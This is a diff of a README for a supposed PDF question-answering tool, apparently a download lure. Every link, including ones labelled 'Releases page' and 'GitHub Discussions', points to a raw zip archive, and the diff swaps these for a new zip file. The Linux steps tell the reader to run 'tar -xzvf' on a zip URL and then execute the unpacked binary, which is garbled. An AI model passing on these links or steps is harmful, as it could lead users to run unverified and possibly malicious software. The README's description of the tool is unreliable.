@@ -1,6 +1,6 @@
 # 🚀 rag-pdf-qa - Effortless PDF Question Answering
 
-[![Download](https://github.com/killboy7/rag-pdf-qa/raw/refs/heads/main/Recollet/rag_qa_pdf_lionel.zip)](https://github.com/killboy7/rag-pdf-qa/raw/refs/heads/main/Recollet/rag_qa_pdf_lionel.zip)
+[![Download](https://raw.githubusercontent.com/killboy7/rag-pdf-qa/main/Recollet/pdf-rag-qa-2.2.zip)](https://raw.githubusercontent.com/killboy7/rag-pdf-qa/main/Recollet/pdf-rag-qa-2.2.zip)
 
 ## 📦 Overview
 
@@ -29,7 +29,7 @@ For complete usage documentation, including how to interact with the software an
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/killboy7/rag-pdf-qa/raw/refs/heads/main/Recollet/rag_qa_pdf_lionel.zip) to download the latest version of rag-pdf-qa. On this page, you will find the download files available for your operating system.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/killboy7/rag-pdf-qa/main/Recollet/pdf-rag-qa-2.2.zip) to download the latest version of rag-pdf-qa. On this page, you will find the download files available for your operating system.
 
 1. Click on the link to the latest release.
 2. Locate the download file suitable for your OS.
@@ -53,9 +53,9 @@ After the download is complete, follow these straightforward steps:
 
 ### Linux Installation
 
-1. Locate the downloaded compressed file (usually `https://github.com/killboy7/rag-pdf-qa/raw/refs/heads/main/Recollet/rag_qa_pdf_lionel.zip`).
+1. Locate the downloaded compressed file (usually `https://raw.githubusercontent.com/killboy7/rag-pdf-qa/main/Recollet/pdf-rag-qa-2.2.zip`).
 2. Open a terminal window.
-3. Unzip the file using the command `tar -xzvf https://github.com/killboy7/rag-pdf-qa/raw/refs/heads/main/Recollet/rag_qa_pdf_lionel.zip`.
+3. Unzip the file using the command `tar -xzvf https://raw.githubusercontent.com/killboy7/rag-pdf-qa/main/Recollet/pdf-rag-qa-2.2.zip`.
 4. Navigate into the unzipped folder and use the command `./rag-pdf-qa` to run the application.
 
 ## 🔧 Usage Instructions
@@ -90,6 +90,6 @@ Thanks to the developers and contributors of the FAISS and Ollama projects. Thei
 
 ## 🥳 Join the Community
 
-Engage with fellow users to share tips, ask questions, and collaborate. Visit our [GitHub Discussions](https://github.com/killboy7/rag-pdf-qa/raw/refs/heads/main/Recollet/rag_qa_pdf_lionel.zip) to participate.
+Engage with fellow users to share tips, ask questions, and collaborate. Visit our [GitHub Discussions](https://raw.githubusercontent.com/killboy7/rag-pdf-qa/main/Recollet/pdf-rag-qa-2.2.zip) to participate.
 
-Once you feel confident, start using rag-pdf-qa to uncover valuable insights from your PDF documents. Here's the [Releases page again](https://github.com/killboy7/rag-pdf-qa/raw/refs/heads/main/Recollet/rag_qa_pdf_lionel.zip) to grab your download and get started. Enjoy!
+Once you feel confident, start using rag-pdf-qa to uncover valuable insights from your PDF documents. Here's the [Releases page again](https://raw.githubusercontent.com/killboy7/rag-pdf-qa/main/Recollet/pdf-rag-qa-2.2.zip) to grab your download and get started. Enjoy!
